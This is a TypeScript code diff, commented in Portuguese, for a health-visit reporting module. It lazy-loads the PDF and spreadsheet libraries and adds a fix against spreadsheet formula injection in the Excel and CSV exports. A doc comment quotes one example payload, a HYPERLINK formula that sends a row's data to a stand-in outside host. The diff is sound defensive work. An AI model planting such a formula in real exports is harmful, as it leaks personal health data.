@@ -3,9 +3,6 @@
 import { createClient } from '@/lib/supabase/client';
 import { format } from 'date-fns';
 import { ptBR } from 'date-fns/locale';
-import jsPDF from 'jspdf';
-import autoTable from 'jspdf-autotable';
-import * as XLSX from 'xlsx';
 import type {
   RelatorioFiltros,
   VisitaComDetalhes,
@@ -201,17 +198,52 @@ export async function gerarRelatorioCobertura(
 }
 
 /**
+ * Neutraliza injeção de fórmula em planilha.
+ *
+ * Excel e LibreOffice executam o conteúdo de uma célula que começa com `=`,
+ * `+`, `-`, `@`, tabulação ou retorno de carro. As observações da visita são
+ * texto livre digitado pelo agente em campo, então um valor como
+ * `=HYPERLINK("http://fora.example/"&A1,"clique")` vazaria a linha inteira no
+ * momento em que alguém da secretaria abrisse o relatório. Em sistema de
+ * órgão público isso é exfiltração de dado de saúde por um clique.
+ *
+ * O apóstrofo faz a planilha tratar o valor como texto, e ele não aparece na
+ * célula.
+ */
+function neutralizarFormula(valor: unknown): string {
+  const texto = valor == null ? '' : String(valor);
+  return /^[=+\-@\t\r]/.test(texto) ? `'${texto}` : texto;
+}
+
+/**
+ * Carrega o jsPDF sob demanda.
+ *
+ * O jsPDF, o jspdf-autotable e o xlsx somavam cerca de 300 kB no primeiro
+ * carregamento da tela de relatórios, que ia a 442 kB, e nenhum deles é
+ * necessário antes de a pessoa escolher o formato e clicar em gerar. Com
+ * import dinâmico, quem só olha a prévia não baixa nada disso.
+ */
+async function carregarPdf() {
+  const [{ default: jsPDF }, { default: autoTable }] = await Promise.all([
+    import('jspdf'),
+    import('jspdf-autotable'),
+  ]);
+  return { jsPDF, autoTable };
+}
+
+/**
  * Exporta dados em formato PDF e dispara o download.
  * @param dados Array de objetos com os dados
  * @param titulo Título do relatório
  * @param colunas Definição das colunas (header e key)
  */
-export function exportarPDF(
+export async function exportarPDF(
   dados: unknown[],
   titulo: string,
   colunas: { header: string; key: string }[]
-): void {
+): Promise<void> {
   try {
+    const { jsPDF, autoTable } = await carregarPdf();
     const doc = new jsPDF();
 
     // Cabeçalho
@@ -268,19 +300,17 @@ export function exportarPDF(
  * @param titulo Título do relatório (usado como nome da aba e do arquivo)
  * @param colunas Definição das colunas (header e key)
  */
-export function exportarExcel(
+export async function exportarExcel(
   dados: unknown[],
   titulo: string,
   colunas: { header: string; key: string }[]
-): void {
+): Promise<void> {
   try {
+    const XLSX = await import('xlsx');
     const headers = colunas.map((c) => c.header);
     const rows = dados.map((item) => {
       const row = item as Record<string, unknown>;
-      return colunas.map((c) => {
-        const value = row[c.key];
-        return value != null ? value : '';
-      });
+      return colunas.map((c) => neutralizarFormula(row[c.key]));
     });
 
     const worksheetData = [headers, ...rows];
@@ -326,10 +356,11 @@ export function exportarCSV(
       const row = item as Record<string, unknown>;
       return colunas
         .map((c) => {
-          const value = row[c.key];
-          if (value == null) return '';
-          const str = String(value);
-          // Escapa valores que contêm vírgula, aspas ou quebra de linha
+          // Neutraliza antes de escapar. O escape de vírgula e aspas não
+          // impede a planilha de executar uma célula que começa com `=`:
+          // são problemas diferentes e o antigo só tratava o primeiro.
+          const str = neutralizarFormula(row[c.key]);
+          if (str === '') return '';
           if (str.includes(',') || str.includes('"') || str.includes('\n')) {
             return `"${str.replace(/"/g, '""')}"`;
           }
@@ -466,9 +497,9 @@ export async function gerarRelatorio(
   const colDefs = columns.map((c) => ({ header: c, key: c }));
 
   if (formato === 'pdf') {
-    exportarPDF(data, titulo, colDefs);
+    await exportarPDF(data, titulo, colDefs);
   } else if (formato === 'excel') {
-    exportarExcel(data, titulo, colDefs);
+    await exportarExcel(data, titulo, colDefs);
   } else {
     exportarCSV(data, titulo, colDefs);
   }
